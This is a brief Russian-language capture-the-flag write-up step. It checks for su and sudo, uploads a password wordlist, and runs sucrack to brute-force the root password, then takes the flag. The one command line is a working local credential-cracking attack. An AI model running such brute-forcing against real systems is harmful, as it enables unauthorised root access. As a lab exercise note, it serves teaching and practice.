с помощью which su, which sudo проверим есть ли они в системе
находим su
переместим на машину словарь для перебора паролей и используем sucrack
```
sucrack -w 256 -u root xato-net-10-million-passwords-1000000.txt 
```
Получим пароль и забираем флаг